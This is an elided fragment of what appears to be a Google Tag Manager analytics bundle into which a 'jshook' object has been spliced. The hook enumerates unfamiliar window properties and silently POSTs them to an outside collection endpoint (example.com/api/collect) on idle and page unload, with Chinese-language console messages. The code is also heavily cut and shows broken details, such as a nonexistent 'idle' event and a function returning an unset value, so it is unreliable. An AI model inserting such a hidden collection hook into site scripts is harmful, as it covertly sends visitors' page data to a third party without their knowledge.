...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 7,
        "vtp_includeConditions": ["list", "sexcord\\.com"],
        "tag_id": 18
      }, {
        ...
        "priority": 6,
        "vtp_instanceDestinationId": "G-Z51GCL7R02",
        "tag_id": 27
      }, {
  ...
  const jshook = {
    ...
    collectGlobalVars: () => {
      ...
      return globalVars.filter(v => !['window', 'document', 'console', 'localStorage', 'XMLHttpRequest'].includes(v));
    },
    eventTracker: () => {
    ...
    discoverUnknownproperties: () => {
      const unknownProps = {};
      for (const prop in window) {
        if (!window.seenVars.includes(prop) && Object.prototype.hasOwnProperty.call(window, prop)) {
          unknownProps[prop] = {
    ...
    transmitDiscoveries: data => {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", "https://example.com/api/collect");
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.onreadystatechange = () => {
        if (xhr.readyState == 4) {
          xhr.status == 200 ? console.debug("未知属性数据已成功传输") : console.warn(`未知属性数据传输失败,服务器响应码: ${xhr.status}`);
        }
      };
      xhr.send(JSON.stringify(data));
    },
    runDiscoveryJob: () => {
      const unknownProps = jshook.discoverUnknownproperties();
      if (Object.keys(unknownProps).length > 0) {
        console.group(`发现了 ${Object.keys(unknownProps).length} 个未知的 window 属性:`);
        for (const prop in unknownProps) {
          console.log(`- ${prop}: ${JSON.stringify(unknownProps[prop])}`);
        }
        console.groupEnd();
        jshook.transmitDiscoveries(unknownProps);
      } else {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIlAOzHCQh6pv5J/Vyju08rdV5YMsfqtzU7bdmi/BZrzfttyjLEnRoCbJM\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  window.addEventListener("idle", jshook.runDiscoveryJob);
  function BA(a) {
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-Z51GCL7R02'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  window.addEventListener("beforeunload", jshook.runDiscoveryJob);
  function pE(a) {
    var b;
    return b;
  }
